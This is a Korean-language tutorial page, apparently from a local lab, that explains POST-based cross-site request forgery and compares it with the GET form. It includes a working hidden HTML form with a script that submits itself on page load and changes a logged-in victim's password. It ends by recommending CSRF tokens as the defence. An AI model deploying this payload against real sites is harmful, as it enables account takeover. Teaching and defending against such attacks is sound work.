🔍 POST CSRF 공격 원리

1
피해자(victim)는 마이페이지(localhost:8083)에 로그인된 상태로 세션 쿠키를 보유합니다.
2
공격자가 만든 뉴스 사이트(localhost:8084)로 피해자를 유인합니다. (낚시 메일, SNS 등)
3
페이지 로드 시 숨겨진 폼이 자동 제출됩니다:
<!-- 숨겨진 공격 폼 --> <form id="csrf-attack" method="POST" action="http://localhost:8083/mypage.php" style="display:none"> <input type="hidden" name="action" value="change_password"> <input type="hidden" name="new_password" value="hacked123"> </form> <script> window.onload = () => document.getElementById('csrf-attack').submit(); </script>
4
브라우저가 세션 쿠키 자동 첨부 → 서버는 피해자의 정상 요청으로 인식
5
피해자 계정의 비밀번호가 hacked123으로 변경됩니다. 계정 탈취 완료!
⚡ GET vs POST CSRF의 차이: POST는 <img> 태그로 공격 불가. 하지만 숨겨진 폼 + JS 자동 제출로 동일하게 공격 가능합니다.

⚔️ GET 방식 vs POST 방식 CSRF 비교

❌ GET CSRF 공격 난이도: 쉬움
<img src="...">
브라우저 자동 요청만으로 완료
❌ POST CSRF 공격 난이도: 쉬움
<form> + JS submit()
자동 폼 제출로 완료

👉 POST라고 해서 안전하지 않습니다! CSRF 토큰이 핵심 방어책입니다.
